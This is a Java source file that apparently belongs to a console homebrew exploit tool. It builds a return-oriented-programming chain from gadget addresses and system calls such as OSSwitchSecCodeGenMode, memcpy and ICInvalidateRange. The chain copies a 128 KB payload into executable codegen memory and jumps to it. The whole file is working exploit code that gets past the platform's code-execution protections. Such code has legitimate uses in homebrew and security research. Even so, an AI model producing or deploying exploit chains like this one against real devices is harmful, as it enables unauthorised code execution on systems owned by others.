package com.skettios.kexdroid;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;

public class RopChain
{
    public static byte[] generate(int heapAddress, SystemVersions systemVersion, int sourceAddress)
            throws Exception
    {
        int payloadSize = 131072;
        int codegenAddress = 25165824;

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        switchToCore1(systemVersion, out);
        copyCodebinToCodegen(codegenAddress, sourceAddress, payloadSize, systemVersion, out);

        popr24Tor31(
                systemVersion.getConstantInt("OSFatal"),
                systemVersion.getConstantInt("Exit"),
                systemVersion.getConstantInt("OSDynLoad_Acquire"),
                systemVersion.getConstantInt("OSDynLoad_FindExport"),
                systemVersion.getConstantInt("os_snprintf"),
                sourceAddress,
                8,
                heapAddress,
                systemVersion,
                out);


        Util.writeu32(codegenAddress, out);
        Util.writeu32(0, out);
        copyCodebinToCodegen(codegenAddress, sourceAddress, payloadSize, systemVersion, out);

        popr24Tor31(
                systemVersion.getConstantInt("OSFatal"),
                systemVersion.getConstantInt("Exit"),
                systemVersion.getConstantInt("OSDynLoad_Acquire"),
                systemVersion.getConstantInt("OSDynLoad_FindExport"),
                systemVersion.getConstantInt("os_snprintf"),
                sourceAddress,
                8,
                heapAddress,
                systemVersion,
                out);

        Util.writeu32(codegenAddress, out);

        return out.toByteArray();
    }

    private static void copyCodebinToCodegen(int codegenAddress, int sourceAddress, int payloadSize, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        OSSwitchSecCodeGenMode(0, systemVersion, out);
        memcpy(codegenAddress, sourceAddress, payloadSize, systemVersion, out);
        OSSwitchSecCodeGenMode(1, systemVersion, out);
        DCFlushRange(codegenAddress, payloadSize, systemVersion, out);
        ICInvalidateRange(codegenAddress, payloadSize, systemVersion, out);
    }

    private static void DCFlushRange(int address, int size, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        callFunction(systemVersion, systemVersion.getConstantInt("DCFlushRange"), address, size, 0, 0, 0, out);
    }

    private static void ICInvalidateRange(int address, int size, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        callFunction(systemVersion, systemVersion.getConstantInt("ICInvalidateRange"), address, size, 0, 0, 0, out);
    }

    private static void memcpy(int dest, int source, int size, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        callFunction(systemVersion, systemVersion.getConstantInt("memcpy"), dest, source, size, 0, 0, out);
    }

    private static void OSSwitchSecCodeGenMode(int mode, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        callFunction(systemVersion, systemVersion.getConstantInt("OSSwitchSecCodeGenMode"), mode, 0, 0, 0, 0, out);
    }

    private static void switchToCore1(SystemVersions systemVersion, OutputStream out) throws Exception
    {
        callFunction(systemVersion, systemVersion.getConstantInt("OSGetCurrentThread"), 0, 2, 0, 0, systemVersion.getConstantInt("OSSetThreadAffinity"), out);

        Util.writeu32(systemVersion.getConstantInt("CALLR28_POP_R28_TO_R31"), out);
        Util.writeu32(systemVersion.getConstantInt("OSYieldThread"), out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(systemVersion.getConstantInt("CALLR28_POP_R28_TO_R31"), out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
    }


    private static void callFunction(SystemVersions systemVersion, int function, int r3, int r4, int r5, int r6, int r28, OutputStream out)
            throws Exception
    {
        popr24Tor31(r6, r5, 0, systemVersion.getConstantInt("CALLR28_POP_R28_TO_R31"), function, r3, 0, r4, systemVersion, out);
        Util.writeu32(systemVersion.getConstantInt("CALLFUNC"), out);
        Util.writeu32(r28, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);
    }

    private static void popr24Tor31(int r24, int r25, int r26, int r27, int r28, int r29, int r30, int r31, SystemVersions systemVersion, OutputStream out) throws Exception
    {
        Util.writeu32(systemVersion.getConstantInt("POP_R24_TO_R31"), out);
        Util.writeu32(0, out);
        Util.writeu32(0, out);

        Util.writeu32(r24, out);
        Util.writeu32(r25, out);
        Util.writeu32(r26, out);
        Util.writeu32(r27, out);
        Util.writeu32(r28, out);
        Util.writeu32(r29, out);
        Util.writeu32(r30, out);
        Util.writeu32(r31, out);

        Util.writeu32(0, out);
    }
}
